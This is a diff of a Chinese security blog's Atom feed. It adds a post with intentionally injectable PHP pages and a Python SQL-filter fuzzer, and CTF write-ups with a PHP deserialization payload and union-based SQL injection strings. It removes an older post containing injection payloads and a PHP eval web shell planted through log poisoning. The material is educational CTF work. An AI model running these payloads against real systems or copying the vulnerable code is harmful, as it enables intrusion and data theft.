@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://jinqipiaopiao.github.io/</id>
     <title>Gridea</title>
-    <updated>2021-06-20T13:27:00.933Z</updated>
+    <updated>2021-06-22T05:05:49.148Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://jinqipiaopiao.github.io/"/>
     <link rel="self" href="https://jinqipiaopiao.github.io/atom.xml"/>
@@ -10,6 +10,384 @@
     <logo>https://jinqipiaopiao.github.io/images/avatar.png</logo>
     <icon>https://jinqipiaopiao.github.io/favicon.ico</icon>
     <rights>All rights reserved 2021, Gridea</rights>
+    <entry>
+        <title type="html"><![CDATA[SQL注入过滤字符的Fuzz脚本测试]]></title>
+        <id>https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/</id>
+        <link href="https://jinqipiaopiao.github.io/post/sql-zhu-ru-guo-lu-zi-fu-de-fuzz-jiao-ben-ce-shi/">
+        </link>
+        <updated>2021-06-22T04:34:15.000Z</updated>
+        <content type="html"><![CDATA[<p>Get.php</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Sql Waf Test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div style=&quot;text-align:center;&quot;&gt;
+&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
+	&lt;h1&gt;Insert Data&lt;/h1&gt;
+	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
+	&lt;br&gt;&lt;br&gt;
+	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
+	&lt;br&gt;&lt;br&gt;
+	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
+&lt;?php 
+$black_list=&quot;/select|sleep|and|or|union|\&quot;|'|--|#|where|from|limit/i&quot;;
+$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
+mysqli_query($con,&quot;create database test&quot;);
+mysqli_select_db($con,&quot;test&quot;);
+mysqli_query($con,&quot;create table tb_user
+	(
+	uid int(11) primary key auto_increment not null,
+	username varchar(50) not null,
+	password varchar(50) not null,
+	UNIQUE(username)
+	)&quot;);
+if(isset($_GET['submit1'])){
+	$username = $_GET['username'];
+	$password = md5($_GET['password']);
+	if(preg_match($black_list,$username)){
+		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
+	}else{
+		if(empty($username) || empty($password)){
+			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
+		}else{
+			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
+			if($insert_sql){
+				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
+			}else{
+				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
+			}
+		}
+	}
+}
+?&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;div style=&quot;text-align:center;&quot;&gt;
+&lt;form method=&quot;GET&quot; action=&quot;&quot;&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+&lt;h1&gt;Query Data&lt;/h1&gt;
+&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
+&lt;?php 
+if(isset($_GET['submit2'])){
+$query_name = $_GET['query'];
+if(preg_match($black_list,$query_name)){
+die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
+}else{
+if(empty($query_name)){
+echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
+}else{
+$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
+if($query_data){
+$sql_data = mysqli_fetch_assoc($query_data);
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump($sql_data);
+}else{
+echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
+}
+}
+}
+}
+?&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>sql_waf_test.py</p>
+<pre><code>import requests
+
+sql_char = ['select',
+		'union',
+		'and',
+		'or',
+		'sleep',
+		'where',
+		'from',
+		'limit',
+		'group',
+		'by',
+		'like',
+		'prepare',
+		'as',
+		'if',
+		'char',
+		'ascii',
+		'mid',
+		'left',
+		'right',
+		'substring',
+		'handler',
+		'updatexml',
+		'extractvalue',
+		'benchmark',
+		'insert',
+		'update',
+		'all',
+		'@',
+		'#',
+		'^',
+		'&amp;',
+		'*',
+		'\'',
+		'&quot;',
+		'~',
+		'`',
+		'(',
+		')',
+		'--',
+		'=',
+		'/',
+		'\\',
+		' ']
+
+for char in sql_char:
+res = requests.get(&quot;http://127.0.0.1/get.php?query=&quot;+char+&quot;&amp;submit2=sbumit&quot;)
+if 'Illegal Char' in res.text:
+	print(&quot;该字符是非法字符: {0}&quot;.format(char))
+else:
+	print(&quot;通过: {0}&quot;.format(char))
+</code></pre>
+<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
+该字符是非法字符: select<br>
+该字符是非法字符: union<br>
+该字符是非法字符: and<br>
+该字符是非法字符: or<br>
+该字符是非法字符: sleep<br>
+该字符是非法字符: where<br>
+该字符是非法字符: from<br>
+该字符是非法字符: limit<br>
+通过: group<br>
+通过: by<br>
+通过: like<br>
+通过: prepare<br>
+通过: as<br>
+通过: if<br>
+通过: char<br>
+通过: ascii<br>
+通过: mid<br>
+通过: left<br>
+通过: right<br>
+通过: substring<br>
+该字符是非法字符: handler<br>
+通过: updatexml<br>
+通过: extractvalue<br>
+通过: benchmark<br>
+通过: insert<br>
+通过: update<br>
+通过: all<br>
+通过: @<br>
+通过: #<br>
+通过: ^<br>
+通过: &amp;<br>
+通过: *<br>
+该字符是非法字符: '<br>
+该字符是非法字符: &quot;<br>
+通过: ~<br>
+通过: `<br>
+通过: (<br>
+通过: )<br>
+该字符是非法字符: --<br>
+通过: =<br>
+通过: /<br>
+通过: <br>
+通过:</p>
+<p>Post.php</p>
+<pre><code>&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+&lt;head&gt;
+&lt;title&gt;Sql Waf Test&lt;/title&gt;
+&lt;/head&gt;
+&lt;body&gt;
+&lt;div style=&quot;text-align:center;&quot;&gt;
+&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
+	&lt;h1&gt;Insert Data&lt;/h1&gt;
+	&lt;input type=&quot;text&quot; name=&quot;username&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your username&quot;&gt;
+	&lt;br&gt;&lt;br&gt;
+	&lt;input type=&quot;password&quot; name=&quot;password&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Please input your password&quot;&gt;
+	&lt;br&gt;&lt;br&gt;
+	&lt;input type=&quot;submit&quot; name=&quot;submit1&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
+&lt;?php 
+$black_list=&quot;/select|and|or|union|limit/i&quot;;
+$con = mysqli_connect(&quot;127.0.0.1:3306&quot;,&quot;root&quot;,&quot;root&quot;);
+mysqli_query($con,&quot;create database test&quot;);
+mysqli_select_db($con,&quot;test&quot;);
+mysqli_query($con,&quot;create table tb_user
+	(
+	uid int(11) primary key auto_increment not null,
+	username varchar(50) not null,
+	password varchar(50) not null,
+	UNIQUE(username)
+	)&quot;);
+if(isset($_POST['submit1'])){
+	$username = $_POST['username'];
+	$password = md5($_POST['password']);
+	if(preg_match($black_list,$username)){
+		echo &quot;&lt;h2&gt;Illegal Char&lt;h2&gt;&quot;;
+	}else{
+		if(empty($username) || empty($password)){
+			echo &quot;&lt;h2&gt;Username or Password can not be empty&lt;/h2&gt;&quot;;
+		}else{
+			$insert_sql = mysqli_query($con,&quot;insert into tb_user value(0,'$username','$password')&quot;);
+			if($insert_sql){
+				echo &quot;&lt;h2&gt;Insert Success&lt;/h2&gt;&quot;;
+			}else{
+				echo &quot;&lt;h2&gt;Insert Fail&lt;/h2&gt;&quot;;
+			}
+		}
+	}
+}
+?&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;div style=&quot;text-align:center;&quot;&gt;
+&lt;form method=&quot;POST&quot; action=&quot;&quot;&gt;
+&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;
+&lt;h1&gt;Query Data&lt;/h1&gt;
+&lt;input type=&quot;text&quot; name=&quot;query&quot; style=&quot;height:25px;width:250px;&quot; placeholder=&quot;Query Username&quot;&gt;
+&lt;br&gt;&lt;br&gt;
+&lt;input type=&quot;submit&quot; name=&quot;submit2&quot; style=&quot;height:31px;color:#7d7d7d;&quot; value=&quot;sbumit&quot;&gt;
+&lt;?php 
+if(isset($_POST['submit2'])){
+$query_name = $_POST['query'];
+if(preg_match($black_list,$query_name)){
+die(&quot;&lt;h2&gt;Illegal Char&lt;/h2&gt;&quot;);
+}else{
+if(empty($query_name)){
+echo &quot;&lt;h2&gt;Query data can not be empty&lt;/h2&gt;&quot;;
+}else{
+$query_data = mysqli_query($con,&quot;select * from tb_user where username='$query_name'&quot;);
+if($query_data){
+$sql_data = mysqli_fetch_assoc($query_data);
+echo &quot;&lt;br&gt;&lt;br&gt;&lt;br&gt;&lt;br&gt;&quot;;
+var_dump($sql_data);
+}else{
+echo &quot;&lt;h2&gt;Query Fail&lt;/h2&gt;&quot;;
+}
+}
+}
+}
+?&gt;
+&lt;/form&gt;
+&lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;
+</code></pre>
+<p>sql_waf_test.py</p>
+<pre><code>import requests
+
+sql_char = ['select',
+		'union',
+		'and',
+		'or',
+		'sleep',
+		'where',
+		'from',
+		'limit',
+		'group',
+		'by',
+		'like',
+		'prepare',
+		'as',
+		'if',
+		'char',
+		'ascii',
+		'mid',
+		'left',
+		'right',
+		'substring',
+		'handler',
+		'updatexml',
+		'extractvalue',
+		'benchmark',
+		'insert',
+		'update',
+		'all',
+		'@',
+		'#',
+		'^',
+		'&amp;',
+		'*',
+		'\'',
+		'&quot;',
+		'~',
+		'`',
+		'(',
+		')',
+		'--',
+		'=',
+		'/',
+		'\\',
+		' ']
+url = &quot;http://127.0.0.1/get.php&quot;
+header = {
+'Host':'127.0.0.1',
+'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0',
+'Accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
+'Accept-Language':'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
+'Accept-Encoding':'gzip, deflate',
+'Content-Type':'application/x-www-form-urlencoded'
+}
+for char in sql_char:
+post_data = &quot;query=test&quot;+char+&quot;&amp;submit2=sbumit&quot;
+res = requests.post(url,data=post_data,headers=header)
+if 'Illegal Char' in res.text:
+	print(&quot;该字符是非法字符: {0}&quot;.format(char))
+else:
+	print(&quot;通过: {0}&quot;.format(char))
+</code></pre>
+<p>PS C:\Users\Administrator\Desktop&gt; python .\sql_waf_test.py<br>
+该字符是非法字符: select<br>
+该字符是非法字符: union<br>
+该字符是非法字符: and<br>
+该字符是非法字符: or<br>
+通过: sleep<br>
+通过: where<br>
+通过: from<br>
+该字符是非法字符: limit<br>
+通过: group<br>
+通过: by<br>
+通过: like<br>
+通过: prepare<br>
+通过: as<br>
+通过: if<br>
+通过: char<br>
+通过: ascii<br>
+通过: mid<br>
+通过: left<br>
+通过: right<br>
+通过: substring<br>
+该字符是非法字符: handler<br>
+通过: updatexml<br>
+通过: extractvalue<br>
+通过: benchmark<br>
+通过: insert<br>
+通过: update<br>
+通过: all<br>
+通过: @<br>
+通过: #<br>
+通过: ^<br>
+通过: &amp;<br>
+通过: *<br>
+通过: '<br>
+通过: &quot;<br>
+通过: ~<br>
+通过: `<br>
+通过: (<br>
+通过: )<br>
+通过: --<br>
+通过: =<br>
+通过: /<br>
+通过: <br>
+通过:<br>
+————————————————<br>
+版权声明：本文为CSDN博主「末 初」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/mochu7777777/article/details/108073359</p>
+]]></content>
+    </entry>
     <entry>
         <title type="html"><![CDATA[md5相关比较]]></title>
         <id>https://jinqipiaopiao.github.io/post/md5-xiang-guan-bi-jiao/</id>
@@ -592,6 +970,201 @@ tmp = &quot;start=&gt;{0},mid={1},end={2}&quot;.format(start,mid,end)
 print(''.join(chr(x) for x in mids))
 </code></pre>
 <figure data-type="image" tabindex="2"><img src="https://jinqipiaopiao.github.io//post-images/1624089437125.png" alt="" loading="lazy"></figure>
+<h1 id="网鼎杯-2020-青龙组areuserialz">[网鼎杯 2020 青龙组]AreUSerialz</h1>
+<p>1.题目源码</p>
+<pre><code>&lt;?php
+
+include(&quot;flag.php&quot;);
+
+highlight_file(__FILE__);
+
+class FileHandler {
+
+protected $op;
+protected $filename;
+protected $content;
+
+function __construct() {
+$op = &quot;1&quot;;
+$filename = &quot;/tmp/tmpfile&quot;;
+$content = &quot;Hello World!&quot;;
+$this-&gt;process();
+}
+
+public function process() {
+if($this-&gt;op == &quot;1&quot;) {
+$this-&gt;write();
+} else if($this-&gt;op == &quot;2&quot;) {
+$res = $this-&gt;read();
+$this-&gt;output($res);
+} else {
+$this-&gt;output(&quot;Bad Hacker!&quot;);
+}
+}
+
+private function write() {
+if(isset($this-&gt;filename) &amp;&amp; isset($this-&gt;content)) {
+if(strlen((string)$this-&gt;content) &gt; 100) {
+$this-&gt;output(&quot;Too long!&quot;);
+die();
+}
+$res = file_put_contents($this-&gt;filename, $this-&gt;content);
+if($res) $this-&gt;output(&quot;Successful!&quot;);
+else $this-&gt;output(&quot;Failed!&quot;);
+} else {
+$this-&gt;output(&quot;Failed!&quot;);
+}
+}
+
+private function read() {
+$res = &quot;&quot;;
+if(isset($this-&gt;filename)) {
+$res = file_get_contents($this-&gt;filename);
+}
+return $res;
+}
+
+private function output($s) {
+echo &quot;[Result]: &lt;br&gt;&quot;;
+echo $s;
+}
+
+function __destruct() {
+if($this-&gt;op === &quot;2&quot;)
+$this-&gt;op = &quot;1&quot;;
+$this-&gt;content = &quot;&quot;;
+$this-&gt;process();
+}
+
+}
+
+function is_valid($s) {
+for($i = 0; $i &lt; strlen($s); $i++)
+if(!(ord($s[$i]) &gt;= 32 &amp;&amp; ord($s[$i]) &lt;= 125))
+return false;
+return true;
+}
+
+if(isset($_GET{'str'})) {
+
+$str = (string)$_GET['str'];
+if(is_valid($str)) {
+$obj = unserialize($str);
+}
+
+}
+</code></pre>
+<p>这是一个PHP反序列化的题目，首先看到需要传入一个’str’，而且通过is_valid()规定了传入的每一个字符的ASCII码的范围必须在32到125之间，然后对这个’str’进行反序列化操作。</p>
+<p>在反序列化中，先调用__destruct()析构方法：</p>
+<pre><code>function __destruct() {
+if($this-&gt;op === &quot;2&quot;)
+$this-&gt;op = &quot;1&quot;;
+$this-&gt;content = &quot;&quot;;
+$this-&gt;process();
+}
+</code></pre>
+<p>从__destruct()代码中可以看到，如果op === “2”，那么op会被赋值为&quot;1&quot;，然后content会赋值为空，并执行process函数，这里 if 中的判断语句用的是强类型比较。<br>
+然后看看process函数：</p>
+<pre><code>public function process() {
+if($this-&gt;op == &quot;1&quot;) {
+$this-&gt;write();
+} else if($this-&gt;op == &quot;2&quot;) {
+$res = $this-&gt;read();
+$this-&gt;output($res);
+} else {
+$this-&gt;output(&quot;Bad Hacker!&quot;);
+}
+}
+</code></pre>
+<p>代码内容为：如果op == “1”，执行write()函数;如果op ==“2”,执行read函数，同时将结果赋值给$res，然后输出；否则将输出&quot;Bad Hacker！&quot;。</p>
+<p>这里 if 语句中的判断语句用的是弱类型的比较，那么只要op=2，这个是int整数型的2，那么op === “2” 则为False， op == &quot;2&quot;则为True，就可以进入read函数。</p>
+<p>再看看read函数：</p>
+<pre><code>private function read() {
+$res = &quot;&quot;;
+if(isset($this-&gt;filename)) {
+$res = file_get_contents($this-&gt;filename);
+}
+return $res;
+}
+</code></pre>
+<p>在read函数中，使用filename调用file_get_contents函数将文件内容赋值给$res输出。</p>
+<p>这里的filename是我们可控的，那么可以用前不久学的php://filter伪协议读取文件。然后使用output函数输出。</p>
+<pre><code>private function output($s) {
+echo &quot;[Result]: &lt;br&gt;&quot;;
+echo $s;
+}
+</code></pre>
+<p>那么现在整个反序列过程就清楚了：<br>
+1.将op = 2<br>
+2.filename = &quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;</p>
+<pre><code>&lt;?php
+class FileHandler {
+
+protected $op=2;
+protected $filename=&quot;php://filter/read=convert.base64-encode/resource=flag.php&quot;;
+protected $content;
+
+}
+
+$a = new FileHandler();
+echo serialize($a);
+?&gt;
+</code></pre>
+<p><img src="https://jinqipiaopiao.github.io//post-images/1624333261046.png" alt="" loading="lazy"><br>
+原因是在于 <code>$op $filename $content</code>三个变量权限都是protected，而protected权限的变量在序列化时会有%00*%00字符，%00字符的ASCII码为0，不在is_valid函数规定的32到125的范围内。<br>
+可以使用一种简单的办法绕过：因为php7.1+版本对属性类型不敏感，本地序列化的时候将属性改为public就可以了。<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624333257382.png" alt="" loading="lazy"><br>
+那么现在就可以使用这个payload来读取flag：</p>
+<pre><code>?str=O:11:%22FileHandler%22:3:{s:2:%22op%22;i:2;s:8:%22filename%22;s:57:%22php://filter/read=convert.base64-encode/resource=flag.php%22;s:7:%22content%22;N;
+</code></pre>
+<p>然后进行解码即可<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624333252468.png" alt="" loading="lazy"><br>
+总结：<br>
+1.区分强类型比较和弱类型比较进行绕过<br>
+2.加深对php序列化和反序列化过程的理解</p>
+<p>php序列化与反序列化方法：</p>
+<pre><code>__construct 当一个对象创建时被调用
+__destruct 当一个对象销毁时被调用
+__toString 当一个对象被当作一个字符串使用
+__sleep 在对象被序列化之前运行
+__wakeup 在对象被反序列化之后被调用
+</code></pre>
+<p>参考：<br>
+https://www.freebuf.com/articles/web/209975.html<br>
+https://www.cnblogs.com/tr1ple/p/11156279.html</p>
+<p>————————————————<br>
+版权声明：本文为CSDN博主「嗯？？嗯。」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
+原文链接：https://blog.csdn.net/qq_40860153/article/details/109018483</p>
+<h1 id="gxyctf2019babysqli">[GXYCTF2019]BabySQli#</h1>
+<p>这题的知识点是绕过密码的md5验证，参考Y1ng师傅的文章<br>
+看到题目，fuzz了一下，过滤的并不多(415是没过滤的，419是过滤的)<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336018360.png" alt="" loading="lazy"><br>
+而且页面源码有给sql语句，不过需要先base32再base64解码</p>
+<pre><code>select * from user where username = '$name'
+</code></pre>
+<p>直接可以用联合注入，表里有三列</p>
+<pre><code>1' Order by 3#
+</code></pre>
+<p>进行用联合注入，回显wrong user!，说明用户不在第一列</p>
+<pre><code>1' union select 1,2,3#
+</code></pre>
+<p>尝试将用户名放在第二列，回显wrong pass!，找到用户名在第二列</p>
+<pre><code>1' union select 1,'admin',3#
+</code></pre>
+<p>接下里就是要绕过密码的md5验证，需要把我们输入的值和数据库里面存放的用户密码的md5值进行比较，那要怎么绕过呢？可以用联合查询语句用来生成虚拟的表数据</p>
+<p>首先可以看到该表只有一个用户<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336023503.png" alt="" loading="lazy"><br>
+然后我们可以用联合查询的方式将查询的数据插入到表中<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336026579.png" alt="" loading="lazy"></p>
+<p>通过这样的方式，我们就可以用构造payload</p>
+<p>用户名输入（‘e10adc3949ba59abbe56e057f20f883e’是 123456的md5值）</p>
+<pre><code>1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#
+</code></pre>
+<p>密码输入</p>
+<pre><code>123456
+</code></pre>
+<p>POST请求 ,获得flag<br>
+<img src="https://jinqipiaopiao.github.io//post-images/1624336030766.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
     <entry>
@@ -1193,431 +1766,6 @@ xorb 1，num2 #结果 num2 ＝ 0b0 相当于 1 ＋ 1 ＝ 0b10, 进位被直接�
 链接：https://www.jianshu.com/p/0027bb0cfdec<br>
 来源：简书<br>
 著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</p>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[CTF.Show:WEB]]></title>
-        <id>https://jinqipiaopiao.github.io/post/ctfshowweb/</id>
-        <link href="https://jinqipiaopiao.github.io/post/ctfshowweb/">
-        </link>
-        <updated>2021-05-20T14:12:00.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="1web签到题">1.web签到题</h1>
-<p>查看源码得到flag<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621520025533.png" alt="" loading="lazy"><br>
-看这貌似好像是base64编码的所以用base64解码即可<br>
-答案是：</p>
-<pre><code>ctfshow{ed2c205b-de98-42c6-a409-2e9cfb93a40e}
-</code></pre>
-<h1 id="2web2最简单的sql注入">2.web2(最简单的sql注入)</h1>
-<p>直接尝试万能密码,登录成功<br>
-order by 查找回显数<br>
-直接用Hack Bar<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621520764430.png" alt="" loading="lazy"><br>
-然后继续用ctfshow登录，并且寻找回显最后找到是3<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621520920000.png" alt="" loading="lazy"><br>
-然后看它返回页面的是哪个用</p>
-<pre><code>username=ctfshow' union select 1,2,3#&amp;password=1
-</code></pre>
-<p>然后返回的是2<br>
-然后在2处构造想要返回的值</p>
-<pre><code>username=ctfshow' union select 1,database(),3#&amp;password=1
-username=ctfshow' union select 1,table_name,3 from information_schema.tables where table_schema=database()#&amp;password=1  # 然后就发现flag表名应该flag在flag表里面
-username=ctfshow' union select 1,column_name,3 from information_schema.columns where table_name='flag'#&amp;password=1  # 然后就发现flag列名所以直接构造
-username=ctfshow' union select 1,flag,3 from flag#&amp;password=1
-</code></pre>
-<p>然后就出现答案：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621521463145.png" alt="" loading="lazy"></p>
-<pre><code>ctfshow{4075920b-d917-44f4-afbe-205e6ee37c1d}
-</code></pre>
-<h1 id="3web3考的是php伪协议文件包含命令执行">3.web3(考的是php伪协议+文件包含+命令执行)</h1>
-<p>题目的提示：<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522677593.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522682445.png" alt="" loading="lazy"><br>
-看到这个语句，那就是文件包含了，先试下file:etc/passwd,有反应<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522687634.png" alt="" loading="lazy"><br>
-试下有没有flag.txt文件，好像没有这个文件<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522692780.png" alt="" loading="lazy"><br>
-那现在我们利用php伪协议 php://input post提交命令，这里不知道为什么我用hackerbar post提交没有反应，那只能burp抓包咯，利用命令执行 ls，查看当前有啥文件<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522699353.png" alt="" loading="lazy"><br>
-这里出现了一个ctf_go_go_go,那我们用cat打开<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621522705639.png" alt="" loading="lazy"></p>
-<p>正确答案：</p>
-<pre><code>flag{a1b1cd4e-a84e-4eef-af34-0389607a560f}
-</code></pre>
-<p>php伪协议：<br>
-php://filter、 file://可以访问本地的文件<br>
-zip:// 、 phar:// 可以访问本地压缩文件<br>
-php://input post 写入php代码<br>
-data:text/plain,php代码</p>
-<p>总结：题目的提示是<code>&lt;?php include($_GET[&quot;url&quot;]); ?&gt;</code>,第一反应就是文件包含，先利用file协议读取本地文件/etc/passwd看下这里有没有flag，再看下有没有flag.txt文件，这些都没有，那就利用php://input post 提交命令，查看目录有啥文件。<br>
-————————————————<br>
-版权声明：本文为CSDN博主「0d@y」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/m0_46412682/article/details/107303872</p>
-<h1 id="4web4">4.web4</h1>
-<p>页面同上一题<br>
-尝试相同的解法，发现过滤了php。但是/etc/passwd依然可以显示，猜测仍为文件包含漏洞，尝试其他利用方式。</p>
-<p><strong>第一种：日志包含</strong><br>
-通过查看请求头可以知道服务器为nginx，nginx的log在/var/log/nginx/access.log和/var/log/nginx/error.log，其中access.log可以打开。<br>
-为了防止url编码，需要在burp中修改UA为<code>&lt;?php eval($_POST['hack']);?&gt;</code><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621523211899.png" alt="" loading="lazy"><br>
-接着菜刀或蚁剑连接。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621523220855.png" alt="" loading="lazy"><br>
-<strong>第二种：远程文件包含</strong><br>
-使用自己的公网地址，或者可以在这个网站免费注册域名https://natapp.cn/，将端口映射到本地的80端口上，打开自己电脑上的服务器，将一句话文件写入，直接菜刀连接。<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621523224745.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621523229885.png" alt="" loading="lazy"></p>
-<p>————————————————<br>
-版权声明：本文为CSDN博主「yu22x」的原创文章，遵循CC 4.0 BY-SA版权协议，转载请附上原文出处链接及本声明。<br>
-原文链接：https://blog.csdn.net/miuzzx/article/details/104321970</p>
-<h1 id="5web5">5.web5</h1>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621596553717.png" alt="" loading="lazy"><br>
-然后就想到在url后面直接传值MD5相同的两个值，一个全是字符串一个全是数字就可以<br>
-在PHP中，md5('240610708') ==md5('QNKCDZO'）<br>
-然后直接构造?v1=QNKCDZO&amp;v2=240610708然后就可以找到flag值<br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621596750613.png" alt="" loading="lazy"><br>
-正确答案：</p>
-<pre><code>ctfshow{ac285830-aefc-43bb-957e-d7c47a50a923} 
-</code></pre>
-<h1 id="6web6">6.web6</h1>
-<p>此题一出现登录就想到用sql注入<br>
-然后直接构造万能用户名和密码登录(用burp suite的repeater重复发送即可)</p>
-<pre><code>username=admin' or 1=1#&amp;password=1
-</code></pre>
-<p>然后发现出现sql inject error<br>
-说明应该是过滤了某些字符，然后一个个输入发现最后空格变成了+号所以就想到用其它字符来代替空格</p>
-<pre><code>    一般空格被过滤有如下替换方法
-    /**/
-    ()
-    回车(url编码中的%0a)
-    `(tap键上面的按钮)
-    tap
-    两个空格
-</code></pre>
-<p>这里选择/**/</p>
-<pre><code>然后直接构造
-username=admin'/**/or/**/1=1#&amp;password=1    
-
-然后成功继续用ctfshow登录
-username=ctfshow'/**/order/**/by/**/1,2,3,4#&amp;password=1  (这里1，2，3，4需要要么增加要么减少，直到刚好出现ctfshow登陆成功，而增加一个之后发现出不来就是字段数)
-
-然后判断它回显哪几个
-username=ctfshow'/**/union/**/select/**/1,2,3#&amp;password=1 即可知道回显的是那几个最后发现回显的是2号，接下来就是一直爆表名，列名然后就是flag值了
-username=ctfshow'/**/union/**/select/**/1,table_name,3/**/from/**/information_schema.tables/**/where/**/table_schema=database()#&amp;password=1
-username=ctfshow'/**/union/**/select/**/1,column_name,3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#&amp;password=1
-username=ctfshow'/**/union/**/select/**/1,flag,3/**/from/**/flag#&amp;password=123
-</code></pre>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621597807522.png" alt="" loading="lazy"><br>
-正确答案是：</p>
-<pre><code>ctfshow{a4352e3d-e197-4669-865f-024702a90af8}
-</code></pre>
-<h1 id="7web7">7.web7</h1>
-<p><img src="https://jinqipiaopiao.github.io//post-images/1621601171402.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621601175673.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621601179007.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621601183514.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621601186797.png" alt="" loading="lazy"><br>
-<img src="https://jinqipiaopiao.github.io//post-images/1621601337452.png" alt="" loading="lazy"><br>
-和上一关思路一样，都是用注入而且同样也是空格被过滤但是这一关用数字型和字符型都可以<br>
-但是到这一步的时候：</p>
-<pre><code>id=0'/**/union/**/select/**/1,column_name,3/**/from/**/information_schema.columns/**/where/**/table_name='flag'#&amp;password=1
-</code></pre>
-<p>没有任何回显就感觉很奇怪，但是源于上一关的缘故，所以就能想到列名是flag然后就能爆出了</p>
-<h1 id="8web8">8.web8</h1>
-<p>这个看起来和web7很像，但是经过测试，对union进行过滤<br>
-找了别的师傅的payload<br>
-通过布尔盲注，测试存在的表名和字段名，读取flag</p>
-<pre><code>import requests  # requests.session():维持会话,可以让我们在跨请求时保存某些参数
-
-s = requests.session()
